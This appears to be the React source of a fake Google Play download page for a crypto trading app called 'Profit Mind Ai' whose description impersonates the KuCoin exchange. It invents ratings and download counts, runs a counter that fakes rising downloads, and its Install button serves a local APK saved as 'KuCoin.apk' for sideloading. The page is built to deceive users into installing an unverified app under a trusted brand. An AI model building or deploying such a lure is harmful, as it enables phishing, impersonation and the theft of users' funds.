import React, { useState, useEffect } from 'react';
import {
  Download,
  Share2,
  BookmarkPlus,
  ChevronRight,
  Star,
  Info,
  Loader2,
} from 'lucide-react';

function App() {
  const [downloadState, setDownloadState] = useState<
    'idle' | 'downloading' | 'completed'
  >('idle');
  const [downloadProgress, setDownloadProgress] = useState(0);
  const [downloadSize, setDownloadSize] = useState({ current: 0, total: 0 });
  const [totalDownloads, setTotalDownloads] = useState(0);

  // Simulate increasing downloads in real-time
  useEffect(() => {
    const interval = setInterval(() => {
      setTotalDownloads((prev) => prev + Math.floor(Math.random() * 3) + 1);
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  const getFileSize = async (url: string): Promise<number> => {
    try {
      const response = await fetch(url, { method: 'HEAD' });
      const size = Number(response.headers.get('content-length'));
      return size;
    } catch (error) {
      console.error('Error fetching file size:', error);
      return 0;
    }
  };

  const handleInstall = async () => {
    if (downloadState === 'idle') {
      setDownloadState('downloading');

      try {
        // Get the actual file size
        const fileSize = await getFileSize('/sample-app.apk');
        const fileSizeInMB = fileSize / (1024 * 1024);
        setDownloadSize((prev) => ({
          ...prev,
          total: Number(fileSizeInMB.toFixed(2)),
        }));

        // Start the download
        const response = await fetch('/sample-app.apk');
        const reader = response.body?.getReader();
        let receivedLength = 0;

        while (true && reader) {
          const { done, value } = await reader.read();

          if (done) {
            break;
          }

          receivedLength += value.length;
          const progress = (receivedLength / fileSize) * 100;
          const currentSize = receivedLength / (1024 * 1024);

          setDownloadProgress(Math.round(progress));
          setDownloadSize((prev) => ({
            ...prev,
            current: Number(currentSize.toFixed(2)),
          }));

          // Add a small delay to make the progress visible
          await new Promise((resolve) => setTimeout(resolve, 50));
        }

        // Trigger file download
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = 'KuCoin.apk';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        window.URL.revokeObjectURL(url);

        setDownloadState('completed');
      } catch (error) {
        console.error('Download failed:', error);
        setDownloadState('idle');
        alert('Download failed. Please try again.');
      }
    } else if (downloadState === 'completed') {
      alert('Opening file in device gallery...');
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="border-b border-gray-200">
        <nav className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center space-x-8">
            <div className="h-8 w-8">
              <svg viewBox="0 0 24 24" className="w-full h-full text-gray-900">
                <path
                  fill="currentColor"
                  d="M3.375 3C2.339 3 1.5 3.84 1.5 4.875v.75c0 1.036.84 1.875 1.875 1.875h17.25c1.035 0 1.875-.84 1.875-1.875v-.75C22.5 3.839 21.66 3 20.625 3H3.375z"
                />
                <path
                  fill="currentColor"
                  d="m3.087 9 .54 9.176A3 3 0 0 0 6.62 21h10.757a3 3 0 0 0 2.995-2.824L20.913 9H3.087zm6.163 3.75A.75.75 0 0 1 10 12h4a.75.75 0 0 1 0 1.5h-4a.75.75 0 0 1-.75-.75z"
                />
              </svg>
            </div>
            <div className="flex space-x-6">
              <button className="text-gray-600 hover:text-gray-900">
                Games
              </button>
              <button className="text-gray-600 hover:text-gray-900">
                Apps
              </button>
              <button className="text-gray-600 hover:text-gray-900">
                Kids
              </button>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <button className="p-2 hover:bg-gray-100 rounded-full">
              <Info className="h-6 w-6 text-gray-600" />
            </button>
          </div>
        </nav>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="flex flex-col lg:flex-row lg:items-start lg:space-x-8">
          {/* App Icon and Info */}
          <div className="flex-1">
            <div className="flex items-start space-x-6">
              <div className="w-32 h-32 rounded-3xl shadow-lg bg-emerald-500 p-6 relative overflow-hidden">
                <div className="absolute inset-0 bg-gradient-to-br from-emerald-400 to-emerald-600"></div>
                <div className="relative z-10 w-full h-full text-white">
                  <svg viewBox="0 0 24 24" className="w-full h-full">
                    <path
                      fill="currentColor"
                      d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-6h2v2h-2zm0-8h2v6h-2z"
                    />
                  </svg>
                </div>
              </div>
              <div className="flex-1">
                <h1 className="text-3xl font-bold text-gray-900">
                  Profit Mind Ai{' '}
                </h1>
                <p className="text-sm text-emerald-600 mt-1">Trade Ai</p>
                <div className="mt-4 flex items-center space-x-4">
                  <div className="flex items-center">
                    <Star className="h-5 w-5 text-yellow-400 fill-current" />
                    <span className="ml-1 text-sm text-gray-600">
                      4.5 • 253K reviews
                    </span>
                  </div>
                  <span className="text-sm text-gray-600">
                    58.2K+ Downloads
                  </span>
                  <div className="flex items-center">
                    <span className="text-sm text-gray-600">Rated for 3+</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="mt-6 flex items-center space-x-4">
              <button
                onClick={handleInstall}
                className={`relative px-8 py-2 rounded-full text-white font-medium transition-all duration-300 ${
                  downloadState === 'downloading'
                    ? 'bg-emerald-600 cursor-wait'
                    : downloadState === 'completed'
                    ? 'bg-emerald-700 hover:bg-emerald-800'
                    : 'bg-emerald-600 hover:bg-emerald-700'
                }`}
              >
                <span className="flex items-center space-x-2">
                  {downloadState === 'downloading' && (
                    <>
                      <Loader2 className="h-5 w-5 animate-spin" />
                      <span>
                        {downloadProgress}% • {downloadSize.current.toFixed(1)}/
                        {downloadSize.total}MB
                      </span>
                    </>
                  )}
                  {downloadState === 'completed' ? 'Open' : 'Install'}
                </span>
              </button>
              <button className="p-2 hover:bg-gray-100 rounded-full">
                <Share2 className="h-6 w-6 text-gray-600" />
              </button>
              <button className="p-2 hover:bg-gray-100 rounded-full">
                <BookmarkPlus className="h-6 w-6 text-gray-600" />
              </button>
            </div>

            <div className="mt-4 flex items-center text-gray-600">
              <Download className="h-5 w-5 mr-2" />
              <span className="text-sm">
                This app is available for all of your devices
              </span>
            </div>

            {/* Screenshots */}
            <div className="mt-8">
              <div className="flex space-x-4 overflow-x-auto pb-4">
                {[1, 2, 3, 4, 5].map((index) => (
                  <div
                    key={index}
                    className="h-96 w-48 flex-shrink-0 rounded-2xl bg-gradient-to-br from-emerald-50 to-emerald-100 shadow-lg overflow-hidden relative"
                  >
                    <img
                      src={`https://source.unsplash.com/random/384x768?crypto,${index}`}
                      alt={`Screenshot ${index}`}
                      className="w-full h-full object-cover"
                    />
                  </div>
                ))}
              </div>
            </div>

            {/* About Section */}
            <div className="mt-8">
              <div className="flex items-center justify-between">
                <h2 className="text-xl font-bold text-gray-900">
                  About this app
                </h2>
                <ChevronRight className="h-6 w-6 text-gray-400" />
              </div>
              <p className="mt-4 text-gray-600">
                Welcome to KuCoin! One of the world's leading blockchain and
                crypto exchanges, trusted by over 30 million registered users
                across more than 200 countries and regions.
              </p>
              <p className="mt-2 text-gray-600">
                KuCoin supports 700+ cryptocurrencies with 1200+ trading pairs,
                including Bitcoin (BTC), Ethereum (ETH), Notcoin (NOT), Toncoin
                (TON), Hamster Kombat (HMSTR), KuCoin Token (KCS), Solana (SOL),
                Dogecoin (DOGE), Bitcoin Cash (BCH), new crypto and even meme
                coins here!
              </p>
            </div>
          </div>

          {/* Similar Apps Sidebar */}
          <div className="lg:w-80 mt-8 lg:mt-0">
            <h2 className="text-xl font-bold text-gray-900 mb-4">
              Similar apps
            </h2>
            <div className="space-y-4">
              {[
                {
                  name: 'Binance: Buy Bitcoin & Crypto',
                  developer: 'Binance Inc.',
                  rating: '4.6',
                },
                {
                  name: 'Bybit: Buy Bitcoin & Crypto',
                  developer: 'Bybit',
                  rating: '4.5',
                },
              ].map((app, index) => (
                <div key={index} className="flex items-center space-x-4">
                  <div className="w-16 h-16 rounded-xl bg-gradient-to-br from-emerald-400 to-emerald-600 p-4">
                    <svg
                      viewBox="0 0 24 24"
                      className="w-full h-full text-white"
                    >
                      <path
                        fill="currentColor"
                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-6h2v2h-2zm0-8h2v6h-2z"
                      />
                    </svg>
                  </div>
                  <div className="flex-1">
                    <h3 className="font-medium text-gray-900">{app.name}</h3>
                    <p className="text-sm text-gray-600">{app.developer}</p>
                    <div className="flex items-center mt-1">
                      <Star className="h-4 w-4 text-yellow-400 fill-current" />
                      <span className="ml-1 text-sm text-gray-600">
                        {app.rating}
                      </span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;
